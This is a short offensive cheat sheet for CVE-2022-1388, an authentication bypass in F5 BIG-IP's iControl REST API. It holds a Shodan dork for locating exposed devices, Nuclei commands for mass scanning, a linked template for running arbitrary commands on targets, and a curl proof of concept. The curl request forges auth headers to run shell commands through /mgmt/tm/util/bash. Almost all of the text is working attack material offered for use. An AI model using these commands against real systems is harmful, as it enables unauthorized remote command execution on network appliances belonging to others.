### Authentication bypass vulnerability in the REST component of BIG-IPâ€™s iControl API

#### Tag
```BIG-IP```

#### Dorks
```
Shodan - http.title:"BIG-IP&reg;-+Redirect" +"Server"
```

#### Nuclei Scanning
```
nuclei -l targets.txt -t ~/.local/nuclei-templates/http/cves/2022/CVE-2022-1388.yaml -o vulnerable-targets.txt
```

#### Exploit-POC Nuclei Scanning 
[Template Github](https://github.com/MrCl0wnLab/Nuclei-Template-Exploit-F5-BIG-IP-iControl-REST-Auth-Bypass-RCE-Command-Parameter)  
```
nuclei -l targets.txt -t exploit-CVE-2022-1388.yaml -vv -var CMD="uname -a" -o exploit-poc.txt  
(or)  
nuclei -l targets.txt -t exploit-CVE-2022-1388.yaml -vv -var CMD=commands.txt -o exploit-poc.txt
```

#### POC Manual
```
curl -su admin \ 
-H "Host: localhost:8100" \ 
-H "Content-Type: application/json" \ 
-H "Connection: keep-alive, X-F5-Auth-Token X-F5-Auth-Token: a" \ 
-H "Authorization: Basic YWRtaW46" \
 http://<target-ip>/mgmt/tm/util/bash \
-d '{"command":"run","utilCmdArgs":"-c id"}'
```
